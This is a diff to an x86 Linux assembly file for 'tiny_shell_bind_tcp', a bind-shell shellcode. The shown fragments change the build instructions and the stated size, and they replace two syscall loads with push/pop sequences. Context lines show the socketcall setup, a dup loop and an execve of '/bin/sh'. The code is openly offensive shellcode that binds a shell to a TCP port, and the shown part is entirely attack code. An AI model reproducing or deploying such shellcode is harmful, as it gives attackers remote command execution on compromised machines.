@@ -20,12 +20,12 @@
 
 ;   tiny_shell_bind_tcp
 ;
-;   * 73 bytes
+;   * 75 bytes
 ;   * null-free if the port is
 ;
 ;
-;   # nasm -f elf32 tiny_shell_bind_tcp.asm
-;   # ld -m elf_i386 tiny_shell_bind_tcp.o -o tiny_shell_bind_tcp
+;   # nasm -f elf32 tiny_shell_bind_tcp.asm; \
+;     ld -m elf_i386 tiny_shell_bind_tcp.o -o tiny_shell_bind_tcp
 ;
 ;   Testing
 ;   # ./tiny_shell_bind_tcp
@@ -80,7 +80,8 @@ _start:
 	push ecx		; sockaddr_in struct pointer (struct sockaddr *)
 	push eax		; socket fd (int)
 
-	mov al, 102		; syscall 102 - socketcall
+	push 102		; syscall 102 - socketcall
+	pop eax
 
 	mov ecx, esp		; ptr to argument array
 
@@ -135,7 +136,8 @@ dup_loop:
 	; int execve(const char *filename, char *const argv[], char *const envp[]);
 	; exevcve("/bin/sh", NULL, NULL)
 
-	mov al, 11		; execve syscall
+	push 11			; execve syscall
+	pop eax
 
 	; execve string argument
 	; stack already contains NULL on top
